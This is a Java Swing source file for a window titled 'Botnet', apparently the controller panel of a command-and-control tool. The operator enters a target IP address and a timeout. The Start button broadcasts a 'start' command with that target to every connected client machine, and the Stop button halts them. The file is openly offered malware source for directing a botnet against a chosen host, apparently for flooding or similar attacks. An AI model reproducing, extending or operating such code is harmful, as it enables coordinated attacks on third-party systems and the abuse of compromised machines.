package me.sebsb.gui;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.text.NumberFormat;
import java.util.Arrays;

import javax.swing.JButton;
import javax.swing.JFormattedTextField;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.SwingConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.text.NumberFormatter;

import me.sebsb.ConnectedClient;
import me.sebsb.Server;
import me.sebsb.utils.MessageType;
import me.sebsb.utils.NetUtils;
import me.sebsb.utils.Packet;

public class GuiBotnet extends JFrame {

	private JPanel contentPane;
	private JTextField Title;
	private JFormattedTextField textField;
	
	public GuiBotnet() {
		setResizable(false);
		setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(null);
		
		JLabel lblNewLabel = new JLabel("Botnet");
		lblNewLabel.setBounds(5, 5, 440, 16);
		lblNewLabel.setHorizontalAlignment(SwingConstants.CENTER);
		contentPane.add(lblNewLabel);
		
		Title = new JTextField();
		Title.setToolTipText("IP Address");
		Title.setBounds(160, 65, 130, 26);
		contentPane.add(Title);
		Title.setColumns(10);
		
		JLabel lblNewLabel_1 = new JLabel("IP Address");
		lblNewLabel_1.setHorizontalAlignment(SwingConstants.CENTER);
		lblNewLabel_1.setBounds(160, 51, 130, 16);
		contentPane.add(lblNewLabel_1);
		
		JLabel lblNewLabel_1_1 = new JLabel("Timeout");
		lblNewLabel_1_1.setHorizontalAlignment(SwingConstants.CENTER);
		lblNewLabel_1_1.setBounds(160, 92, 130, 16);
		contentPane.add(lblNewLabel_1_1);
		
	    NumberFormat format = NumberFormat.getInstance();
	    format.setGroupingUsed(false);
	    NumberFormatter formatter = new NumberFormatter(format);
	    formatter.setValueClass(Integer.class);
	    formatter.setMinimum(0);
	    formatter.setMaximum(65535);
	    formatter.setAllowsInvalid(false);
	    formatter.setCommitsOnValidEdit(true);
		textField = new JFormattedTextField(formatter);
		textField.setToolTipText("Timeout");
		textField.setColumns(10);
		textField.setBounds(160, 106, 130, 26);
		contentPane.add(textField);
		
		JButton btnNewButton = new JButton("Stop");
		btnNewButton.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				new Thread(new Runnable() {

					@Override
					public void run() {
						Packet packet = new Packet();
						packet.action = MessageType.BOTNET.getID();
						packet.data = Arrays.asList(new String[] {"stop"});
						for (ConnectedClient cc : Server.getInstance().getClients()) {
							try {
								NetUtils.sendMessage(packet, cc.getPrintWriter());
							} catch (Exception e) {
								e.printStackTrace();
							}
						}
					}
					
				}).start();
			}
			
		});
		btnNewButton.setBounds(80, 201, 130, 60);
		contentPane.add(btnNewButton);
		
		JButton btnSend = new JButton("Start");
		btnSend.setBounds(238, 201, 130, 60);
		btnSend.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				new Thread(new Runnable() {

					@Override
					public void run() {
						Packet packet = new Packet();
						packet.action = MessageType.BOTNET.getID();
						packet.data = Arrays.asList(new String[] {"start", Title.getText(), textField.getText()});
						for (ConnectedClient cc : Server.getInstance().getClients()) {
							try {
								NetUtils.sendMessage(packet, cc.getPrintWriter());
							} catch (Exception e) {
								e.printStackTrace();
							}
						}
					}
					
				}).start();
			}
			
		});
		contentPane.add(btnSend);
	}
}
